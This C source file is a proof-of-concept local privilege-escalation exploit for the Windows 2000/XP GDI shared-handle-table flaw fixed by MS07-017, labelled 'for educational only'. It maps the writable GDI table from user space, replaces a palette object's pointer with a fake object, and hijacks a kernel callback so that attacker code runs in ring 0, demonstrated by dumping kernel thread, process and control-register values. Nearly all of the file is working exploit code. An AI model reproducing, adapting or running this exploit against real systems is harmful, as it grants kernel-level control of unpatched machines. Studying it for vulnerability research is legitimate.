
/*
 * by Lionel d'Hauenens
 *  www.laboskopia.com
 */

#include <stdio.h>
#include <tchar.h>
#include <stdlib.h> 
#include <windows.h> 

typedef enum _SECTION_INFORMATION_CLASS
{
    SectionBasicInformation,
    SectionImageInformation
} SECTION_INFORMATION_CLASS;  
                                                
typedef struct _SECTION_BASIC_INFORMATION {
  ULONG                   Base;
  ULONG                   Attributes;
  LARGE_INTEGER           Size;
} SECTION_BASIC_INFORMATION;

          typedef struct _GDI_ENTRY              // 6 elements, 0x10 bytes (sizeof) 
          {                                                                      
/*0x000*/     struct _BASEOBJECT* pObj;          
              struct                             // 2 elements, 0x4 bytes (sizeof) 
              {                                                                    
/*0x004*/         ULONG32      Lock : 1;         // 0 BitPosition                  
/*0x004*/         ULONG32      Pid_Shifted : 31; // 1 BitPosition                  
              }Share;  
/*0x008*/     WORD         FullUnique;                                           
/*0x00A*/     BYTE         ObjType;                                                 
/*0x00B*/     BYTE         Flags;                                                
/*0x00C*/     PVOID        pUserData;                                                
          } GDI_ENTRY, *PGDI_ENTRY;  

          typedef struct _GDIHandleBitFields // 5 elements, 0x4 bytes (sizeof) 
          {                                                                    
/*0x000*/     ULONG32      Index : 16;       //  0 BitPosition                  
/*0x000*/     ULONG32      Type : 5;         // 16 BitPosition                 
/*0x000*/     ULONG32      AltType : 2;      // 21 BitPosition                 
/*0x000*/     ULONG32      Stock : 1;        // 23 BitPosition                 
/*0x000*/     ULONG32      Unique : 8;       // 24 BitPosition                 
          }GDIHandleBitFields, *PGDIHandleBitFields;

typedef DWORD (WINAPI* NTQUERYSECTION)(HANDLE, ULONG, PVOID,ULONG,PULONG);  
NTQUERYSECTION NtQuerySection;                                              

#define INT3 __asm {int 3};
#define STATUS_SUCCESS 0
#define PAL_TYPE 8

    
static DWORD kprocess;
static DWORD kthread;
static DWORD reg_cr0;
static DWORD reg_cr2;
static DWORD reg_cr3;
//static DWORD reg_cr4;

static __declspec(naked) BOOL func_hook ()
{
	//
	// Hook of fastcall function 
	// unsigned long __fastcall ulIndexedGetNearestFromPalentry(class PALETTE *, COLORREF)
	// Exit with "retn"
	// 
	// Executed code with kernel privilege (Ring0)
//INT3	
	__asm
	{		
		cli
		pushad
        xor esi, esi                   
		xor edi,edi                    
		mov ax,fs                      
		cmp ax, 0x30                   
		jne no_pcr                 
		  mov eax, dword ptr fs:[0x124]  // KTHREAD  
		  mov dword ptr [kthread], eax
		  mov eax, dword ptr [eax+0x44]  // KPROCESS      
		  mov dword ptr [kprocess], eax
no_pcr:                            
		mov eax, cr0 
		mov dword ptr [reg_cr0], eax
		mov eax, cr2
		mov dword ptr [reg_cr2], eax
		mov eax, cr3 
		mov dword ptr [reg_cr3], eax
//;		mov eax, cr4 
//;		mov dword ptr [reg_cr4], eax

		popad 
		sti
		retn
	}        
} 

void Print_error_and_exit ()
{
       printf ("ERROR !\n");
	   system ("PAUSE");  
       exit(0); 
}

void Format_GDI_ENTRY_object (PGDI_ENTRY p_gdi_entry)
{
	printf ("\n      GDI_ENTRY OBJECT :\n");
	printf ("      ------------------\n");
	printf ("      pObject         : 0x%08X\n", p_gdi_entry->pObj);  
	printf ("      Pid             : 0x%08X\n", p_gdi_entry->Share.Pid_Shifted<<1);
	printf ("      Flag Lock (Pid) : 0x%X\n", p_gdi_entry->Share.Lock);
	printf ("      FullUnique      : 0x%04X\n", p_gdi_entry->FullUnique);   
	printf ("      Type            : 0x%02X (PAL_TYPE = %u)\n", p_gdi_entry->ObjType, PAL_TYPE);   
	printf ("      Flags           : 0x%02X\n", p_gdi_entry->Flags);   
	printf ("      pUserData       : 0x%08X\n\n", p_gdi_entry->pUserData);   
}

void Format_GDI_Handle (HANDLE gdi_handle)
{
	PGDIHandleBitFields p_h_bit_fields = (PGDIHandleBitFields)&gdi_handle;
	printf ("\n      GDI_HANDLE :\n");
	printf ("      ------------\n");
	printf ("      Index     : 0x%04X\n", p_h_bit_fields->Index);  
	printf ("      Type      : 0x%04X (PAL_TYPE = %u)\n", p_h_bit_fields->Type, PAL_TYPE); 
	printf ("      AltType   : 0x%04X\n", p_h_bit_fields->AltType); 
	printf ("      Stock     : 0x%04X\n", p_h_bit_fields->Stock); 
	printf ("      Unique    : 0x%04X\n\n", p_h_bit_fields->Unique); 
}

int _tmain(int argc, _TCHAR* argv[])
{
    SECTION_BASIC_INFORMATION SectionInfo;    
    PGDI_ENTRY pGdiEntry;
    PLOGPALETTE pLogPal;
    HPALETTE hPal;
    DWORD OffsetGdiPalEntry; 
    PVOID OriginalPalObject;
    PVOID FalsePalObject; 
       
    HANDLE hThread = GetCurrentThread();  
    DWORD OriginalThreadPriotity = GetThreadPriority (hThread);  
    DWORD hSection = 0; 
    PVOID MapFile = 0;
    HANDLE hProcess = GetCurrentProcess();
    DWORD Pid = GetCurrentProcessId();                 
            
   	NtQuerySection = (NTQUERYSECTION)GetProcAddress(LoadLibraryA( "ntdll.dll"),"NtQuerySection");
    if (!NtQuerySection) Print_error_and_exit (); 

    printf ("O--------------------------------------------------------O\n");                
    printf ("#                GDI Vulnerability Exploit               #\n");
    printf ("#        All Windows 2000/XP before MS07-017 patch       #\n");
    printf ("#--------------------------------------------------------#\n");   
    printf ("# coded by Lionel d'Hauenens                             #\n");
    printf ("#                              http://www.syseclabs.com  #\n");    
    printf ("# For educational only !                                 #\n");
    printf ("O--------------------------------------------------------O\n\n");                                     
             
	printf ("[*] Process ID : 0x%08X\n",Pid);

    // Create Palette
	printf ("[*] Create Palette : ");
    pLogPal = (PLOGPALETTE) calloc (sizeof(LOGPALETTE)+sizeof(PALETTEENTRY), 1);    
    pLogPal->palNumEntries = 1;
    pLogPal->palVersion = 0x300;
    hPal = CreatePalette(pLogPal);  
    
    if (!hPal) Print_error_and_exit (); 
	printf ("OK\n");

	printf ("[*] Handle Palette : 0x%08X\n",hPal);

	Format_GDI_Handle ((HANDLE) hPal);
             
    OffsetGdiPalEntry = (((DWORD)hPal) & 0xFFFF)*sizeof(GDI_ENTRY);       
    OriginalPalObject = NULL; 
     
	printf ("[*] Search handle of section...\n");
    while (hSection<0xFFFF) 
    {
        SectionInfo.Attributes = 0;  
        SectionInfo.Size.QuadPart = 0;
        
        // Map section in virtual memory of user        
        MapFile = MapViewOfFile((HANDLE)hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0); 
        if (MapFile)
        {
            // Checking presence of user Palette         
            NtQuerySection((HANDLE)hSection,0,&SectionInfo,sizeof(SectionInfo),0);
            if ( SectionInfo.Attributes == SEC_COMMIT &&
                     OffsetGdiPalEntry+sizeof(GDI_ENTRY) <= SectionInfo.Size.QuadPart )
            {                                                                                      
                pGdiEntry = (PGDI_ENTRY)(((DWORD)MapFile)+OffsetGdiPalEntry);
				if ( (pGdiEntry->Share.Pid_Shifted<<1) == Pid  &&
					  pGdiEntry->ObjType == PAL_TYPE )
                {
                    // Save original pointer of pal object
                    OriginalPalObject =  (PVOID)pGdiEntry->pObj;                                      
                    break;    
                }
            }
            UnmapViewOfFile(MapFile); 
            MapFile = 0;
        }
        hSection++;
    }
	printf ("[*] Found handle of section : ");
    if (!OriginalPalObject) Print_error_and_exit (); 
	printf ("0x%08X\n",hSection);

	printf ("[*] GDI_ENTRY to original Pal object : \n");
	Format_GDI_ENTRY_object (pGdiEntry);

	printf ("[*] Address of original Pal Object : 0x%08X\n",OriginalPalObject);
    
    // Create the false Pal object	
	printf ("[*] Create false Pal object : ");
	FalsePalObject = NULL;
    FalsePalObject = (PVOID) calloc(0x100/4,4);
	if (!FalsePalObject) Print_error_and_exit ();	
    ((PDWORD)FalsePalObject)[0]      = (DWORD) hPal;       // Handle    
    ((PDWORD)FalsePalObject)[0x14/4] = (DWORD) pLogPal->palNumEntries;  
    ((PVOID*)FalsePalObject)[0x3C/4] = (PVOID) &func_hook; // Hook Interface with user function
                                                           // Original -> unsigned long __fastcall ulIndexedGetNearestFromPalentry(class PALETTE *, COLORREF long) 
	printf ("OK\n"); 
    
    //////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////// 
    kprocess = 0;
    kthread = 0;
    reg_cr0 = 0;
    reg_cr2 = 0;
    reg_cr3 = 0;
//    reg_cr4 = 0;
    
    SetThreadPriority (hThread, THREAD_PRIORITY_TIME_CRITICAL); 
       
         // Activates false Pal object
         pGdiEntry->pObj = FalsePalObject;   
		 printf ("[*] Activates false Pal object : OK\n"); 

		      printf ("[*] Go Ring0 : "); 
              GetNearestPaletteIndex (hPal, 0); //--> call func_hook() with kernel privilege :);
			  printf ("OK\n"); 
           
         // Restores original Pal object
         pGdiEntry->pObj = OriginalPalObject; 
		 printf ("[*] Restores original Pal object : OK\n");  
   
    SetThreadPriority (hThread,OriginalThreadPriotity);  
    //////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////
	printf ("\n[ Ring0 report ]\n\n");
    printf ("      KPROCESS : 0x%08X\n", kprocess);
    printf ("      KTHREAD  : 0x%08X\n\n", kthread);
    printf ("      Control Registers\n");
    printf ("      -----------------\n");
    printf ("      CR0 = 0x%08X\n", reg_cr0);
    printf ("      CR2 = 0x%08X\n", reg_cr2);
    printf ("      CR3 = 0x%08X\n", reg_cr3);
//    printf ("      CR4 = 0x%08X\n", reg_cr4);    

    UnmapViewOfFile(MapFile);
    DeleteObject (hPal);
    free((PVOID)pLogPal);
    free((PVOID)FalsePalObject); 
    printf ("\n\n");
    printf ("That's All Folks !\n");

    system("PAUSE");          
    return (0);   
}

